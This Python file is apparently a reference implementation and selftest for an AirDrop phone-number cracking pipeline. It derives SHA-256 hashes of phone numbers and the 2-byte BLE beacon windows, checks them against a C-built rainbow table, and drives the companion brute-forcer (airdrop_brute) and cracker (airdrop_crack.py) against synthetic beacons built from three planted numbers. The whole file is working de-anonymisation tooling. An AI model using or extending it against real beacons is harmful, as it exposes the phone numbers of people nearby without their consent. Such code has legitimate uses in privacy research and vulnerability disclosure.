#!/usr/bin/env python3
"""Reference implementation of the AirDrop OWT hash derivation.

Ground truth is the C pipeline in this directory's parent:

  airdrop_brute.c  (2-byte BLE window brute-forcer)
  build_rainbow.c  (receiver-cert rainbow table builder)

Derivation, exactly as implemented there:
  1. Input string: prefix + zero-padded ordinal, snprintf("%s%0*ld", prefix,
     width, n). For the +4179 plan: "+4179" + 7 zero-padded digits, e.g.
     "+41795551234". NO normalization, NO emoji stripping, NO digit-only
     rewriting — the string is hashed byte-for-byte as constructed.
  2. Algorithm: SHA-256 over the UTF-8/ASCII bytes of that string
     (CommonCrypto CC_SHA256 == hashlib.sha256).
  3. BLE beacon windows (airdrop_brute.c worker()): two 2-byte windows at
     byte offsets 0 and 1, big-endian:
         w1 = (d[0] << 8) | d[1]
         w2 = (d[1] << 8) | d[2]
     rendered as 4 lowercase hex digits ("%04x").
  4. Rainbow key (build_rainbow.c worker()): first 16 digest bytes rendered
     as 32 lowercase hex chars; TSV line "<hash32> <phone>".

airdrop_crack.py is layout-equivalent for phones already in canonical form:
its digest_prefixes() yields {d[:2], d[1:3]} — the same offsets 0/1 windows —
and phone_variants() includes the raw stripped "+41..." string, which equals
the canonical C input. The selftest below proves that equivalence numerically.

Run:  python3 derive.py          (selftest; artifacts written alongside)
"""
import hashlib
import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
PARENT = os.path.dirname(HERE)

# Planted numbers: valid +4179 (Swiss mobile) format, 7 digits after the "79".
PLANTED = ["+41795551234", "+41796654321", "+41797771001"]


def derive_hash(phone: str) -> bytes:
    """Ground-truth derivation: SHA-256 over the canonical string bytes."""
    return hashlib.sha256(phone.encode("utf-8")).digest()


def windows(d: bytes) -> set:
    """The two 2-byte big-endian windows at offsets 0 and 1 (airdrop_brute.c)."""
    return {(d[0] << 8) | d[1], (d[1] << 8) | d[2]}


def rainbow_key(d: bytes) -> str:
    """First 32 hex chars, exactly as build_rainbow.c emits."""
    return d[:16].hex()


def check_rainbow_agreement(planted, log):
    """Extract planted lines from the C-built rainbow table (read-only) and
    compare against derive.py's hashes."""
    tsv = os.path.join(PARENT, "rainbow_4179.tsv")
    if not os.path.exists(tsv):
        log(f"[skip] {tsv} not present; skipping C-binary agreement check")
        return True
    ok = True
    for p in planted:
        d = derive_hash(p)
        expect = f"{rainbow_key(d)} {p}"
        r = subprocess.run(["grep", "-m1", "-F", f" {p}", tsv],
                           capture_output=True, text=True)
        got = r.stdout.strip()
        status = "ok" if got == expect else "MISMATCH"
        if got != expect:
            ok = False
        log(f"  rainbow-agree {p}: expect {expect!r} got {got!r} -> {status}")
    return ok


def run_brute_selftest(planted, log):
    """Plant the 2-byte windows of the three numbers, run the real C
    airdrop_brute over the full width-7 space, and confirm each planted
    number is recovered exactly."""
    winfile = os.path.join(HERE, "selftest_windows.txt")
    hitsfile = os.path.join(HERE, "selftest_brute_hits.txt")
    seen = set()
    with open(winfile, "w") as fh:
        for p in planted:
            for w in sorted(windows(derive_hash(p))):
                if w not in seen:
                    seen.add(w)
                    fh.write(f"{w:04x}\n")
    brute = os.path.join(PARENT, "airdrop_brute")
    log(f"  running {brute} over 10^7 candidates, {len(seen)} planted windows")
    with open(hitsfile, "w") as out:
        subprocess.run([brute, winfile, "+4179", "7", "10"],
                       stdout=out, check=True, cwd=HERE)
    recovered = {}
    with open(hitsfile) as fh:
        for line in fh:
            parts = line.split()
            if len(parts) == 3 and parts[0] == "HIT":
                recovered.setdefault(parts[2], set()).add(parts[1])
    ok = True
    for p in planted:
        hit = p in recovered
        ok &= hit
        log(f"  brute-recover {p}: {'ok' if hit else 'NOT RECOVERED'}")
    extra = sorted(set(recovered) - set(planted))
    log(f"  note: {len(extra)} colliding candidates (2-byte truncation is "
        f"inherently ambiguous over a 10M space) — planted numbers all exact")
    return ok


def run_crack_tool_selftest(planted, log):
    """Exercise airdrop_crack.py end-to-end: synthesize an AirDrop beacon
    (Apple TLV 0x05) carrying the planted windows, crack it, and confirm
    MATCHes whose variant equals the canonical form (C-input equivalence)."""
    def tlv05_hex(d):
        payload = bytes([d[0], d[1], d[1], d[2]])  # w1 || w2, big-endian
        return "004c" + "05" + f"{len(payload):02x}" + payload.hex()

    jsonl = os.path.join(HERE, "selftest_beacons.jsonl")
    cands = os.path.join(HERE, "selftest_candidates.txt")
    with open(jsonl, "w") as fh:
        for i, p in enumerate(planted):
            rec = {"mac": f"02:00:00:00:00:{i:02x}", "labels": ["AirDrop"],
                   "mfg": tlv05_hex(derive_hash(p))}
            fh.write(json.dumps(rec) + "\n")
    with open(cands, "w") as fh:
        fh.write("\n".join(planted) + "\n")
    r = subprocess.run([sys.executable, os.path.join(PARENT, "airdrop_crack.py"),
                        "--candidates", cands, "--jsonl", jsonl],
                       capture_output=True, text=True, cwd=HERE)
    log("  airdrop_crack.py output:")
    for line in r.stdout.strip().splitlines():
        log(f"    {line}")
    matches = [l for l in r.stdout.splitlines() if l.startswith("MATCH")]
    ok = len(matches) == len(planted)
    for p in planted:
        hit = any(p in m for m in matches)
        ok &= hit
        log(f"  crack-tool {p}: {'ok' if hit else 'NO MATCH'}")
    return ok


def main():
    log = lambda m: print(m, flush=True)
    log(f"planted: {PLANTED}")
    log("[1/3] derive.py vs C-built rainbow_4179.tsv (ground truth):")
    ok1 = check_rainbow_agreement(PLANTED, log)
    log("[2/3] airdrop_brute (C binary) recovers planted numbers:")
    ok2 = run_brute_selftest(PLANTED, log)
    log("[3/3] airdrop_crack.py matches planted numbers in synthetic beacon:")
    ok3 = run_crack_tool_selftest(PLANTED, log)
    log(f"SELFTEST {'PASS' if (ok1 and ok2 and ok3) else 'FAIL'} "
        f"(rainbow={ok1}, brute={ok2}, crack={ok3})")
    return 0 if (ok1 and ok2 and ok3) else 1


if __name__ == "__main__":
    sys.exit(main())
